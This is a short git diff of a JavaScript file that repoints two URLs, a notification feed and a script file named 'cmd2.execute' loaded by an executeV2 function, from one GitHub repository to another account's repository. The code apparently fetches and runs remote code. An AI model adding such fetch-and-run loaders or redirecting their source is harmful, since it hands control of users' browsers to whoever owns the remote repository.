@@ -9,7 +9,7 @@ if (!document.getElementById(notificationContainerId)) {
     console.log('Notification container created dynamically.');
 }
 
-const NOTIFICATION_URL = 'https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/openmessage.json';
+const NOTIFICATION_URL = 'https://raw.githubusercontent.com/royal-server/royal-server/refs/heads/main/openmessage.json';
 
 async function loadNotifications() {
     try {
@@ -319,7 +319,7 @@ if (document.readyState === "loading") {
 let scriptCache = null;
 
 async function executeV2() {
-    const scriptUrl = 'https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/cmd2.execute';
+    const scriptUrl = 'https://raw.githubusercontent.com/royal-server/royal-server/refs/heads/main/cmd2.execute';
     
     try {
         // Check if the script is already cached
